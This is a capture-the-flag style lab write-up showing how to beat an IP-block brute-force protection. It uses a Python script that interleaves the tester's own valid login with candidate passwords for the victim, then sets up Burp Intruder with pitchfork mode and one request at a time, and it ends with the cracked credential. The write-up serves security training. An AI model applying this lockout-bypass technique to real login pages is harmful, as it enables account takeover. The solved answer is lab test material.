## Lab: Broken brute-force protection, IP block

This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page. 


    Your credentials: wiener:peter
    Victim's username: carlos
    Candidate passwords

## Steps

1. first login with the provided carlos and random password more than one time  | response -> incorrect password
| the IP is temporarily blocked try again in 1 min

2. create a wordlist of usernames, (carlos, wiener) only with python and add the the provided candidate passwords list in the python code

print("#### the follwing are the usernames")
for i in range(150):
    if i % 3:
        print("carlos")
    else:
        print("wiener")

print("### the following are the passwords")
with open('passwords.txt', 'r') as f:
    lines = f.readlines()

i = 0
for pwd in lines:
    if i % 3:
        print(pwd.strip('\n'))
    else:
        print("peter")
        print(pwd.strip('\n'))
        i = i+1
    i = i+1

3. run the code u will see carlos, wiener arranged 1 by 1 like this and passwors list down below

carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
------
peter
starwars
klaster
peter
112233
george
peter
computer
michelle
peter
jessica
pepper
peter
1111
zxcvbn
peter
555555
11111
-----

4. send the request to intruder and add  $$ to username and passowrd and set the attack type to pitchfork first list is the users generated by python code and second list is the password list 

5. add the attack to a resource pool with Maximum concurrent requests set to 1. By only sending one request at a time, you can ensure that your login attempts are sent to the server in the correct order.

6. start the attack | looking for 302 status code with carlos username
creds: carlos:mom

